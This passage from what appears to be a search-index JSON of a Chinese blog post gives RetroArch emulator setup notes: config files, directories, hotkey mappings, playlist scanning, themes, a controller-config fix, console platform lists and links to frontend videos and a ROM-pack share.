Corps</p>","tags":["retroarch","\u865a\u62df\u6e38\u620f\u623f"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/09/29/%E5%A4%8D%E5%8F%A4%E6%A8%A1%E6%8B%9F%E5%99%A8%E5%89%8D%E7%AB%AF/#\u914d\u7f6e\u6587\u4ef6","title":"\u914d\u7f6e\u6587\u4ef6","text":"<p>\u5168\u5c40\u914d\u7f6e retroarch.cfg\uff0c\u6bcf\u6b21\u4fee\u6539\u5b8c\u8bbe\u7f6e\u540e\u8bb0\u5f97\u5728\u83dc\u5355\u4e2d\u624b\u52a8\u4fdd\u5b58\uff1a\u83dc\u5355-\u300b\u914d\u7f6e\u6587\u4ef6-\u300b\u4fdd\u5b58\u5f53\u524d\u914d\u7f6e</p> <p>There are three types of overrides, which follow a specific hierarchy: core overrides, content directory overrides, and game overrides.</p> <p>\u4e00\u4e9b\u57fa\u672c\u8bbe\u7f6e</p> <ul> <li>\u83dc\u5355</li> <li>\u8bbe\u7f6e<ul> <li>\u754c\u9762<ul> <li>\u5916\u89c2</li> <li>\u83dc\u5355\u53ef\u89c1\u6027\uff1a\u5f71\u54cd\u9664\u4e86 playlist \u5916\u80fd\u770b\u5230\u7684\u9875\u9762\u3002\u5efa\u8bae\u6253\u5f00\uff1a\u6536\u85cf\u3001\u5386\u53f2\u3001\u56fe\u7247\u3001\u63a2\u7d22</li> <li>\u8bed\u8a00</li> <li>\u83dc\u5355\uff1aozone \u9ed1\u8272\u98ce\u683c\u7684\u754c\u9762\uff0cxmb PS3 \u98ce\u683c</li> </ul> </li> <li>\u8f93\u5165</li> <li>\u6587\u4ef6\u5939</li> </ul> </li> </ul>","tags":["retroarch","\u865a\u62df\u6e38\u620f\u623f"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/09/29/%E5%A4%8D%E5%8F%A4%E6%A8%A1%E6%8B%9F%E5%99%A8%E5%89%8D%E7%AB%AF/#\u8bbe\u7f6e\u6587\u4ef6\u76ee\u5f55","title":"\u8bbe\u7f6e\u6587\u4ef6\u76ee\u5f55","text":"<ul> <li>asset\uff08\u7d20\u6750\uff09\uff1a\u5f71\u54cd\u4e3b\u9898\u58c1\u7eb8\u7b49\u7684\u8def\u5f84</li> <li>thumbnails \uff08\u7f29\u7565\u56fe\uff09\uff1a\u6e38\u620f\u770b\u5230\u7684\u7f29\u7565\u56fe</li> <li>file browser\uff1a\u6587\u4ef6\u6d4f\u89c8\u5668\uff0c\u5efa\u8bae\u4fee\u6539\uff0c\u8fd9\u6837\u4e0b\u6b21\u6253\u6d4f\u89c8\u6587\u4ef6\u4f1a\u4ece\u6b64\u5904\u6253\u5f00</li> <li>configuration\uff1a\u914d\u7f6e\u6587\u4ef6\uff1a\u4fdd\u5b58\u9ed8\u8ba4\u914d\u7f6e\u7684\u6587\u4ef6\u5939\uff0c\u9ed8\u8ba4 ~/.config/retroarch/config\uff0c\u4fee\u6539\u5230\u522b\u7684\u5730\u65b9\u65b9\u4fbf\u4fee\u6539</li> <li>playlist\uff1a\u5b58\u653e\u6e38\u620f\u5217\u8868</li> <li>screenshots\uff1a\u622a\u56fe</li> <li>saves\uff1a\u5b58\u6863\u6587\u4ef6</li> <li>states\uff1a\u72b6\u6001\u6587\u4ef6</li> </ul> <p>\u5bf9\u4e8e\u6211\u4eec\u8fd9\u79cd\u81ea\u5df1\u6574\u7406 playlist \u7684\u60c5\u51b5\uff0c\u53ea\u9700\u8981\u4fee\u6539\u5176\u4e2d thumbnails, playlist \u5373\u53ef\u4fdd\u6301\u6e38\u620f\u6574\u7406\u7684\u6548\u679c</p>","tags":["retroarch","\u865a\u62df\u6e38\u620f\u623f"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/09/29/%E5%A4%8D%E5%8F%A4%E6%A8%A1%E6%8B%9F%E5%99%A8%E5%89%8D%E7%AB%AF/#\u66f4\u65b0-retroarch-\u8d44\u6e90\u6838\u5fc3\u7b49","title":"\u66f4\u65b0 RetroArch \u8d44\u6e90\u3001\u6838\u5fc3\u7b49","text":"<p>\u4e3b\u83dc\u5355 &gt; Online Updater</p> <ul> <li>Update Core Info Files\u00a0\u66f4\u65b0\u6838\u5fc3\u4fe1\u606f\u6587\u4ef6</li> <li>Update Assets\u00a0\u66f4\u65b0\u8d44\u4ea7</li> <li>Update Controller Profiles     \u66f4\u65b0\u63a7\u5236\u5668\u914d\u7f6e\u6587\u4ef6</li> <li>Update Cheats\u00a0\u66f4\u65b0\u79d8\u7c4d</li> <li>Update Databases\u00a0\u66f4\u65b0\u6570\u636e\u5e93</li> <li>Update Shaders\u00a0\u66f4\u65b0\u7740\u8272\u5668</li> </ul> <pre><code>Arcade (FB Alpha 2012) -- for low-end devices\nArcade (FinalBurn Neo) -- fighting games and beat'em ups\nArcade (MAME 2003-Plus) -- all-around arcade emulation\nCommodore Amiga (PUAE)\nDOS (DosBox-Pure)\nNEC PCE/TG-16/PCE-CD/TG-CD (Beetle PCE)\nNintendo GB/GBC (Gambatte)\nNintendo GBA (gpSP or mGBA)\nNintendo Virtual Boy (Beetle VB)\nNintendo DS (melonDS)\nNintendo NES (Nestopia or fceumm)\nNintendo SNES (Snes9x Current)\nNintendo 64 (ParaLLEl or Mupen64Plus)\nNintendo GameCube/Wii (Dolphin)\nScummVM -- point-and-click PC games\nSega Master System/Genesis/CD (Genesis Plus GX)\nSega 32x (PicoDrive)\nSega Saturn (YabaSanshiro or Beetle Saturn)\nSega Dreamcast (Flycast)\nSNK Neo Geo (FinalBurn Neo)\nSony PlayStation (DuckStation, SwanStation, or PCSX ReARMed)\nSony PlayStation 2 (PCSX2)\nSony Playstation Portable (PPSSPP)\n</code></pre>","tags":["retroarch","\u865a\u62df\u6e38\u620f\u623f"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/09/29/%E5%A4%8D%E5%8F%A4%E6%A8%A1%E6%8B%9F%E5%99%A8%E5%89%8D%E7%AB%AF/#\u8c03\u6574\u7528\u6237\u754c\u9762\u4e3b\u9898","title":"\u8c03\u6574\u7528\u6237\u754c\u9762\uff08\u4e3b\u9898\uff09","text":"<p>Settings &gt; User Interface &gt; Menu and adjust it to one of the other menus</p> <p>\u5173\u95ed\u4e00\u4e9b\u83dc\u5355\u9879\uff1a - Settings &gt; User Interface &gt; Menu Item Visibility </p>","tags":["retroarch","\u865a\u62df\u6e38\u620f\u623f"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/09/29/%E5%A4%8D%E5%8F%A4%E6%A8%A1%E6%8B%9F%E5%99%A8%E5%89%8D%E7%AB%AF/#\u6309\u94ae\u6620\u5c04-\u548c-hotkeys","title":"\u6309\u94ae\u6620\u5c04 \u548c hotkeys","text":"<p>Settings &gt; Input &gt; Port 1 Controls &gt; Set All Controls and follow the prompts. Settings &gt; Input &gt; Hotkeys</p> <p></p> <ul> <li>Confirm Quit\uff1a\u9000\u51fa\u65f6\u662f\u5426\u4e8c\u6b21\u786e\u8ba4</li> <li>Menu Toggle Controller Combo\uff1a\u6682\u505c\u6e38\u620f\u5e76\u6253\u5f00 Quick memu\uff0c\u72ec\u7acb\u4e8e\u5176\u5b83\u70ed\u952e\u8bbe\u7f6e\uff0c\u56e0\u6b64\u603b\u80fd\u901a\u8fc7\u8fd9\u4e2a\u7ec4\u5408\u952e\u8c03\u51fa\u83dc\u5355\u3002\u63a8\u8350\u8bbe\u7f6e\u6210\u6309\u4f4f start \u952e\u4e24\u79d2</li> <li>Hotkey Enable\uff1a\uff08\u76f8\u5f53\u4e8e tmux \u7684 Prefix\uff09\u8fd9\u5c06\u662f\u60a8\u7684\u4e3b\u8981\u70ed\u952e\u6309\u94ae\u3002 \u60a8\u5728\u4e0b\u9762\u7684\u9009\u9879\u4e2d\u9009\u62e9\u7684\u6bcf\u4e2a\u70ed\u952e\u90fd\u9700\u8981\u4e0e\u60a8\u7684\u70ed\u952e\u542f\u7528\u6309\u94ae\u7ed3\u5408\u4f7f\u7528\u3002\u4e3a\u6b64\uff0c\u6211\u901a\u5e38\u9009\u62e9 SELECT \u6309\u94ae\u3002 \u8fd9\u610f\u5473\u7740 SELECT + \u6211\u9009\u62e9\u7684\u4efb\u4f55\u5176\u4ed6\u70ed\u952e\u90fd\u5c06\u662f\u6211\u6fc0\u6d3b\u70ed\u952e\u5feb\u6377\u65b9\u5f0f\u7684\u6309\u94ae\u7ec4\u5408\u3002</li> </ul> <p>\u63a8\u8350\u8bbe\u7f6e\u7684\u5feb\u6377\u952e <pre><code>Hotkey Enable: SELECT button\nFast-Forward (Toggle): R2 button\nRewind: L2 button *\nLoad State: L1 button\nSave state: R1 button\nShow FPS (Toggle): Y button\nPause (Toggle): A button **\nReset Game: B button\nClose Content (or Quit RetroArch): START button ***\nMenu (Toggle): X button\nVolume Up: Left d-pad\nVolume Down: Right d-pad\nRun-Ahead (Toggle): Up d-pad\n</code></pre></p> <p>\u8981\u4f7f\u5012\u5e26\u529f\u80fd\u6b63\u5e38\u5de5\u4f5c\uff0c\u60a8\u9700\u8981\u8fdb\u5165\u8bbe\u7f6e &gt; \u5e27\u8282\u6d41 &gt; \u5012\u5e26 &gt; \u6253\u5f00\u3002\u6211\u4e0d\u5efa\u8bae\u5c06\u6b64\u529f\u80fd\u4f5c\u4e3a\u5168\u5c40\u914d\u7f6e\u6253\u5f00\uff0c\u56e0\u4e3a\u67d0\u4e9b\u7cfb\u7edf\uff08\u5982 Saturn \u6216 PS1\uff09\u5728\u542f\u7528\u5b83\u65f6\u4f1a\u975e\u5e38\u6162\uff0c\u800c\u67d0\u4e9b\u7cfb\u7edf\uff08\u5982 PSP\uff09\u53ef\u80fd\u4f1a\u76f4\u63a5\u5d29\u6e83\u3002\u76f8\u53cd\uff0c\u6211\u5efa\u8bae\u73b0\u5728\u8bbe\u7f6e\u70ed\u952e\uff0c\u7136\u540e\u5bf9\u4e8e\u60a8\u60f3\u8981\u4f7f\u7528\u5012\u5e26\u7684\u7cfb\u7edf\uff08\u4f8b\u5982 NES\uff09\uff0c\u60a8\u53ef\u4ee5\u901a\u8fc7\u6309 SELECT + X \u8fdb\u5165\u5feb\u6377\u83dc\u5355\uff0c\u7136\u540e\u6253\u5f00\u5012\u5e26\u5e76\u5c06\u5176\u4fdd\u5b58\u4e3a\u6838\u5fc3\u8986\u76d6\u3002</p> <p>\u8bf7\u6ce8\u610f\uff0c\u60a8\u7684 SELECT + START \u70ed\u952e\u5e94\u8bbe\u7f6e\u4e3a\u201cClose Content\u201d\u6216\u201cQuit RetroArch\u201d\uff0c\u4f46\u8fd9\u53d6\u51b3\u4e8e\u60a8\u7684\u7528\u4f8b\u3002\u5982\u679c\u60a8\u6253\u7b97\u4f7f\u7528 RetroArch \u4f5c\u4e3a\u524d\u7aef\uff0c\u90a3\u4e48\u60a8\u5c06\u9700\u8981 Close Content \u4ee5\u8fd4\u56de RetroArch \u83dc\u5355\u3002\u5982\u679c\u60a8\u4f7f\u7528\u7684\u662f\u5176\u4ed6\u524d\u7aef\uff0c\u4f8b\u5982 EmulationStation \u6216 LaunchBox\uff0c\u5219\u9700\u8981\u5c06\u5176\u8bbe\u7f6e\u4e3a Quit RetroArch\uff0c\u4ee5\u4fbf\u5728\u4f7f\u7528\u6b64\u70ed\u952e\u65f6\u5c06\u60a8\u8fd4\u56de\u5230\u524d\u7aef\u3002</p> <p>\u53ef\u9009\u529f\u80fd</p> <p>\u6211\u559c\u6b22\u4e3a\u6211\u7684\u6e38\u620f\u8bbe\u7f6e\u7684\u4e00\u4e2a\u9009\u9879\u662f\u00a0AUTO SAVE / AUTO LOAD\u3002\u8fd9\u5c06\u5728\u60a8\u5173\u95ed\u6e38\u620f\u65f6\u521b\u5efa\u4e00\u4e2a\u4fdd\u5b58\u72b6\u6001\uff0c\u7136\u540e\u5728\u60a8\u518d\u6b21\u542f\u52a8\u6e38\u620f\u65f6\u52a0\u8f7d\u8be5\u4fdd\u5b58\u72b6\u6001\u3002\u5b83\u4e3a\u60a8\u7684\u590d\u53e4\u6e38\u620f\u63d0\u4f9b\u4e86\u4e00\u79cd\u5373\u73a9\u5373\u73a9\u7684\u611f\u89c9\u3002\u8981\u8bbe\u7f6e\u6b64\u9879\uff0c\u8bf7\u4f7f\u7528\u4ee5\u4e0b\u4e24\u4e2a\u547d\u4ee4\uff1a</p> <ul> <li>Settings &gt; Saving &gt; Auto Save State &gt; ON  </li> <li>Settings &gt; Saving &gt; Load State Automatically &gt; ON </li> </ul>","tags":["retroarch","\u865a\u62df\u6e38\u620f\u623f"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/09/29/%E5%A4%8D%E5%8F%A4%E6%A8%A1%E6%8B%9F%E5%99%A8%E5%89%8D%E7%AB%AF/#\u521b\u5efa\u64ad\u653e\u5217\u8868","title":"\u521b\u5efa\u64ad\u653e\u5217\u8868","text":"<p>\u5728 RetroArch \u4e2d\u521b\u5efa\u64ad\u653e\u5217\u8868\u6709\u4e24\u79cd\u65b9\u6cd5\uff1a</p> <p>SCAN DIRECTORY\uff1a\u81ea\u52a8\u626b\u63cf\u3002RetroArch \u5c06\u81ea\u52a8\u8bc6\u522b\u7cfb\u7edf\u7c7b\u578b\u3002\u9002\u5408\u4e8e\u5177\u6709\u4e0d\u540c\u6587\u4ef6\u7c7b\u578b\u7684\u89e3\u538b\u7f29 ROM \u7684\u7cfb\u7edf\uff08\u5982 .nes \u6e38\u620f\uff09</p> <p>MANUAL SCAN\uff1a\u8fd9\u662f\u626b\u63cf\u76ee\u5f55\u7684\u9996\u9009\u65b9\u6cd5\uff0c\u56e0\u4e3a\u5b83\u4e3a\u60a8\u63d0\u4f9b\u4e86\u66f4\u591a\u63a7\u5236\u6743\u3002</p> <ul> <li>\u7cfb\u7edf\u540d\u79f0\uff1a\u9009\u62e9\u8981\u4e0e\u64ad\u653e\u5217\u8868\u5173\u8054\u7684\u7cfb\u7edf\u540d\u79f0\uff0c\u53ef\u4ee5\u81ea\u5b9a\u4e49</li> <li>Default Core\uff1a\u9009\u62e9\u8981\u4e0e\u6b64\u64ad\u653e\u5217\u8868\u5173\u8054\u7684\u6838\u5fc3\u3002\u4e4b\u540e\uff0c\u60a8\u53ef\u4ee5\u901a\u8fc7\u9009\u62e9\u6e38\u620f\u5e76\u9009\u62e9\u201cSet Core Association\u201d\u6765\u4e3a\u7279\u5b9a\u6e38\u620f\u5206\u914d\u4e0d\u540c\u7684\u6838\u5fc3</li> <li>\u626b\u63cf\u6863\u6848\u5185\u90e8\uff1a\u8fd9\u5c06\u626b\u63cf zip \u6587\u4ef6\u4e2d\u7684\u6587\u4ef6\uff0c\u662f\u5426\u542f\u7528\u6b64\u9009\u9879\u5c06\u53d6\u51b3\u4e8e\u60a8\u6b63\u5728\u626b\u63cf\u7684\u7cfb\u7edf\u3002\u5982\u679c\u626b\u63cf\u8857\u673a\u6e38\u620f\uff0c\u60a8\u5c06\u5e0c\u671b\u5173\u95ed\u6b64\u529f\u80fd</li> </ul> <p>\u6574\u6570\u7f29\u653e</p> <ul> <li>Settings &gt; Video &gt; Scaling &gt; Integer Scaling</li> <li>RetroArch \u5c06\u653e\u5927\u5230\u4f4e\u4e8e\u8bbe\u5907\u5206\u8fa8\u7387\u7684\u6700\u5927\u6574\u6570\u6bd4\u4f8b\u3002\u56e0\u6b64\uff0c\u5bf9\u4e8e\u539f\u59cb\u5206\u8fa8\u7387\u4e3a 640\u00d7480 \u7684 Nintendo 64 \u6e38\u620f\uff0c\u5b83\u5c06\u7f29\u653e\u5230 2 \u500d\u6216 1240\u00d7960\uff0c\u56db\u8fb9\u90fd\u6709\u9ed1\u8272\u8fb9\u6846\u3002\u8fd9\u5c06\u4fdd\u6301 1\uff1a1 \u7684\u50cf\u7d20\u6bd4\u4f8b\uff0c\u53ea\u8981\u60a8\u4e0d\u4ecb\u610f\u56fe\u50cf\u5468\u56f4\u7684\u9ed1\u6761\uff0c\u4e00\u5207\u90fd\u4f1a\u770b\u8d77\u6765\u6f02\u4eae\u800c\u6e05\u6670\u3002</li> <li>\u5982\u679c\u4e0d\u542f\u7528\u6574\u6570\u7f29\u653e\uff0c\u56fe\u50cf\u5c06\u7f29\u653e\u4ee5\u5339\u914d\u8bbe\u5907\u7684\u663e\u793a\uff08\u540c\u65f6\u4fdd\u6301\u7eb5\u6a2a\u6bd4\uff09\uff0c\u4ee5\u5c3d\u53ef\u80fd\u591a\u5730\u586b\u5145\u5c4f\u5e55\uff0c\u4f46\u8fd9\u53ef\u80fd\u4f1a\u5bfc\u81f4\u50cf\u7d20\u5931\u771f\uff0c\u4ece\u800c\u4f7f\u67d0\u4e9b\u50cf\u7d20\u5728\u663e\u793a\u5668\u4e0a\u770b\u8d77\u6765\u5931\u771f\u3002\u60a8\u53ef\u80fd\u6ca1\u6709\u6ce8\u610f\u5230\u5dee\u5f02\uff0c\u8fd9\u5b8c\u5168\u6ca1\u95ee\u9898\u3002\u60a8\u8fd8\u53ef\u4ee5\u4f7f\u7528\u7740\u8272\u5668\u6216\u6ee4\u955c\u6765\u91cd\u65b0\u5e73\u8861\u56fe\u50cf\uff0c\u5982\u4e0b\u9762\u7684\u90e8\u5206\u6240\u793a\u3002</li> </ul>","tags":["retroarch","\u865a\u62df\u6e38\u620f\u623f"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/09/29/%E5%A4%8D%E5%8F%A4%E6%A8%A1%E6%8B%9F%E5%99%A8%E5%89%8D%E7%AB%AF/#retroarch-\u7f8e\u5316","title":"retroarch \u7f8e\u5316","text":"<p>\u5747\u4f4d\u4e8e assets \u76ee\u5f55</p>","tags":["retroarch","\u865a\u62df\u6e38\u620f\u623f"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/09/29/%E5%A4%8D%E5%8F%A4%E6%A8%A1%E6%8B%9F%E5%99%A8%E5%89%8D%E7%AB%AF/#\u4e2d\u6587","title":"\u4e2d\u6587","text":"<p>\u6e38\u620f\u7684\u4e2d\u6587\u4f1a\u4e71\u7801</p> <p>\u7cfb\u7edf\u9009\u62e9\u4e2d\u6587\u8bed\u8a00\u53ef\u4ee5\u89e3\u51b3\u8fd9\u4e2a\u95ee\u9898\u3002</p> <p>\u53d1\u73b0 playlist \u7f16\u7801\u5c45\u7136\u6709\u53ef\u80fd\u662f GBK\uff1f\u626b\u63cf\u5230\u7684\u4e2d\u6587\u6e38\u620f\uff0c\u90fd\u4f1a\u663e\u793a\u95ee\u53f7\u3002</p>","tags":["retroarch","\u865a\u62df\u6e38\u620f\u623f"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/09/29/%E5%A4%8D%E5%8F%A4%E6%A8%A1%E6%8B%9F%E5%99%A8%E5%89%8D%E7%AB%AF/#\u58c1\u7eb8\u80cc\u666f\u97f3\u4e50","title":"\u58c1\u7eb8\u3001\u80cc\u666f\u97f3\u4e50","text":"<p>Retroarch\u2606How to Customize Retroarch Menu, Themes, and Icons #retroarch #emulator #frontend - YouTube</p> <ul> <li>\u8bbe\u7f6e<ul> <li>\u754c\u9762<ul> <li>\u5916\u89c2<ul> <li>\u7740\u8272\u5668\u901a\u9053\uff1a\u80cc\u666f\u52a8\u753b\u6548\u679c\uff0c\u53ef\u4ee5\u8bd5\u8bd5</li> <li>\u80cc\u666f\u56fe\u50cf</li> </ul> </li> </ul> </li> </ul> </li> </ul> <p></p> <ul> <li>\u97f3\u9891<ul> <li>\u83dc\u5355\u58f0\u97f3\uff1a\u5168\u90e8\u5f00\u542f<ul> <li>\u64ad\u653e\u7684\u80cc\u666f\u97f3\u9ed8\u8ba4\u662f <code>~/assets/sounds/bgm.ogg</code></li> <li>\u6309\u952e\u97f3\u4e5f\u662f\u5bf9\u5e94\u540d\u79f0\u7684\u97f3\u9891\u6587\u4ef6</li> </ul> </li> </ul> </li> </ul>","tags":["retroarch","\u865a\u62df\u6e38\u620f\u623f"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/09/29/%E5%A4%8D%E5%8F%A4%E6%A8%A1%E6%8B%9F%E5%99%A8%E5%89%8D%E7%AB%AF/#\u4e3b\u9898\u56fe\u6807","title":"\u4e3b\u9898\u56fe\u6807","text":"<p>lipebello/Retroarch-XMB-Retrorama-Theme: Retrorama Theme for Retroarch XMB UI (github.com)</p> <p>xmb \u4e3b\u9898\uff0c\u4e0b\u9762\u6709\u8fd9\u4e48\u591a\u79cd\u56fe\u6807\u4e3b\u9898</p> <ul> <li>automatic</li> <li>daite</li> <li>dot-art</li> <li>flatui</li> <li>flatux</li> <li>monochrome</li> <li>pixel</li> <li>retrosystem</li> <li>systematic</li> </ul> <p>\u9009\u62e9 FlatUI\uff0c<code>assets/xmb/flatui</code> \u5305\u542b\u4ee5\u4e0b\u5185\u5bb9</p> <pre><code>flatui\n\u251c\u2500\u2500 font.ttf\n\u251c\u2500\u2500 png\n\u2514\u2500\u2500 README.md\n</code></pre> <p>png \u4e0b\u5305\u542b\u4e86\u6bcf\u4e2a\u6e38\u620f\u673a\u7684\u56fe\u6807\uff0c\u548c\u5361\u5e26\u7684\u56fe\u6807\u3002\u547d\u540d\u683c\u5f0f\u793a\u4f8b\u5982\u4e0b\uff08\u53ef\u4ee5\u5c06 <code>\u8bbe\u7f6e-\u300b\u5217\u8868-\u300b\u4ece\u5217\u8868\u4e2d\u79fb\u9664\u4e3b\u673a\u5382\u5546\u540d\u5b57</code> \u5173\u95ed\uff0c\u9ed8\u8ba4\u662f\u6253\u5f00\u7684\uff09 <pre><code>'(1983) Nintendo - FC-content.png'\n'(1983) Nintendo - FC.png'\n</code></pre></p> <p></p>","tags":["retroarch","\u865a\u62df\u6e38\u620f\u623f"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/09/29/%E5%A4%8D%E5%8F%A4%E6%A8%A1%E6%8B%9F%E5%99%A8%E5%89%8D%E7%AB%AF/#\u9047\u5230\u7684\u95ee\u9898","title":"\u9047\u5230\u7684\u95ee\u9898","text":"","tags":["retroarch","\u865a\u62df\u6e38\u620f\u623f"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/09/29/%E5%A4%8D%E5%8F%A4%E6%A8%A1%E6%8B%9F%E5%99%A8%E5%89%8D%E7%AB%AF/#\u624b\u67c4\u5931\u7075","title":"\u624b\u67c4\u5931\u7075","text":"<ul> <li>\u5168\u80fd\u624b\u67c4\uff08RetroPad\uff09\u6309\u952e\u7ed1\u5b9a<ul> <li>\u7aef\u53e31 \u63a7\u5236<ul> <li>\u8bbe\u5907\u7f16\u53f7</li> </ul> </li> </ul> </li> </ul> <p>\u67e5\u770b\u8bbe\u5907\u7f16\u53f7\uff0c\u5982\u679c\u662f\u5947\u602a\u7684\u7f16\u53f7\uff0c\u5219\u8bf4\u660e\u4f60\u4e4b\u524d\u4fdd\u5b58\u4e86\u624b\u67c4\u914d\u7f6e\u6587\u4ef6\u3002\u5220\u9664\u5373\u53ef</p> <pre><code>rm udev/Wolf\\ X-Box\\ One\\ \\(virtual\\)\\ pad.cfg\n</code></pre>","tags":["retroarch","\u865a\u62df\u6e38\u620f\u623f"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/09/29/%E5%A4%8D%E5%8F%A4%E6%A8%A1%E6%8B%9F%E5%99%A8%E5%89%8D%E7%AB%AF/#\u5e73\u53f0\u5217\u8868","title":"\u5e73\u53f0\u5217\u8868","text":"<pre><code>name_list = [\\\n    \"(1989) NEC - PC Engine\",\n\n    \"(1988) Sega - MegaDrive\",\n    \"(1994) Sega - Saturn\",\n    \"(1998) Sega - DreamCast\",\n\n    \"(1989) Nintendo - GB\",\n    \"(1998) Nintendo - GBC\",\n    \"(2001) Nintendo - GBA\",\n    \"(2004) Nintendo - NDS\",\n    \"(2011) Nintendo - 3DS\",\n\n    \"(1983) Nintendo - FC\",\n    \"(1990) Nintendo - SFC\",\n    \"(1996) Nintendo - N64\",\n    #(2001) \"Nintendo - NGC\",\n    \"(2006) Nintendo - Wii\",\n    # \"(2012) Nintendo - WiiU\",\n\n    \"(2004) Sony - PSP\",\n    # \"(2011) Sony - PSV\",\n    \"(1994) Sony - PS1\",\n    \"(2000) Sony - PS2\",\n    # \"(2006) Sony - PS3\",\n    # \"(2013) Sony - PS4\",\n]\n</code></pre> <p>\u4e16\u5609List of Sega video game consoles - Wikipedia</p> <p>\u4e3b\u673a</p> <ul> <li>MD: Mega Drive, 1988</li> <li>SS: Sega Saturn, 1994</li> <li>DC: Dreamcast, 1998, 6</li> </ul> <p>\u7d22\u5c3cPlayStation - Wikipedia</p> <p>\u638c\u673a</p> <ul> <li>PSP: 2004, 7</li> <li>PSV: 2011</li> </ul> <p>\u4e3b\u673a</p> <ul> <li>PS1: 1994, 5</li> <li>PS2: 2000, 6</li> <li>PS3: 2006, 7</li> <li>PS4: 2013, 8</li> </ul> <p>\u4efb\u5929\u5802Nintendo video game consoles - Wikipedia</p> <p>\u638c\u673a</p> <ul> <li>GB(1989), GBC(1998), GBA(2001)</li> <li>NDS/DS(2004)</li> <li>3DS(2011)</li> </ul> <p>\u4e3b\u673a</p> <ul> <li>FC/NES:1983</li> <li>SFC/SNES: 1990</li> <li>N64: 1996</li> <li>NGC/game cube: 2001</li> <li>WII 2006</li> <li>WIIU 2012</li> <li>Switch</li> </ul> <p>\u8857\u673a</p> <ul> <li>neogeo: snk, \u62f3\u7687\uff0c\u5408\u91d1\u5f39\u5934</li> <li>cps1,2,3</li> <li>mame</li> </ul> <ul> <li> <p>oldman \u8d44\u6e90</p> <pre><code>SFC  201M x\nGBA_499 3.6G\n\nNGC  15G\nWii  120G\n\nSS  7.9G\nDC  17.3G x\n\nPS1  37.1G\nPS2  302G/20G\nPSP  319G/10.4G\n</code></pre> </li> </ul> <ul> <li> <p>retroarch \u6574\u5408\u5305</p> <pre><code>FC  66M \nSFC  619M\nGB[C] 100M\nGBA  2.26G \nNDS  3.91G\n3DS  25.6G\nN64  637M\nNGC  4.53G\nWii  53.4G\nWiiU\n\nMD  417M\nSS  4.73G\nDC  22G\n\nPS1  18.8G\nPS2  59.5G\nPSP  21.5G\n\nPCE* 1.49G\n3DO  3.56G\nAracade 4.36G\n</code></pre> </li> </ul>","tags":["retroarch","\u865a\u62df\u6e38\u620f\u623f"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/09/29/%E5%A4%8D%E5%8F%A4%E6%A8%A1%E6%8B%9F%E5%99%A8%E5%89%8D%E7%AB%AF/#\u5929\u9a6c","title":"\u5929\u9a6c","text":"<ul> <li>\u624b\u673a\uff1ahttps://www.bilibili.com/video/BV1d7411r7FE/<ul> <li>\u624b\u673a\u4e00\u79d2\u53d8\u5168\u80fd\u6e38\u620f\u673a-\u3010\u5929\u9a6c\u524d\u7aef\u5b89\u5353\u7248\u3011 - \u5145\u6ee1\u6e38\u620f\u541b (fullgame666.com)</li> </ul> </li> <li>PC\uff1ahttps://www.bilibili.com/video/av84836354<ul> <li>\u5410\u8840\u63a8\u8350\u4e00\u4e2a\u6f02\u4eae\u3001\u7b80\u5355\u3001\u5b9e\u7528\u7684\u6a21\u62df\u5668\u524d\u7aef-\u3010\u5929\u9a6c\u524d\u7aefPC\u7248\u3011 - \u5145\u6ee1\u6e38\u620f\u541b (fullgame666.com)</li> </ul> </li> </ul>","tags":["retroarch","\u865a\u62df\u6e38\u620f\u623f"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/09/29/%E5%A4%8D%E5%8F%A4%E6%A8%A1%E6%8B%9F%E5%99%A8%E5%89%8D%E7%AB%AF/#\u5929\u9a6cg-2tb\u8d44\u6e90","title":"\u5929\u9a6cG 2TB\u8d44\u6e90","text":"<ul> <li>\u8df3\u5751\u8005\u8054\u76dfB\u7ad9\u5ba3\u4f20\u89c6\u9891\uff1ahttps://www.bilibili.com/video/BV1eM4y197aY/<ul> <li>rom\uff1a1.7T -&gt; 2.85T</li> </ul> </li> <li>\u767e\u5ea6\u7f51\u76d8\u94fe\u63a5\uff1apan.baidu.com/s/1P-EYhBzxyAWQRL89-ffZqA?pwd=tklm</li> </ul>","tags":["retroarch","\u865a\u62df\u6e38\u620f\u623f"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/09/29/%E5%A4%8D%E5%8F%A4%E6%A8%A1%E6%8B%9F%E5%99%A8%E5%89%8D%E7%AB%AF/#\u6574\u5408\u5305","title":"\u6574\u5408\u5305","text":"<p>\u5929\u9a6cG PC+\u5b89\u5353\u53cc\u5e73\u53f0 \u7cbe\u7b80Rom\u6574\u5408\u5305 + 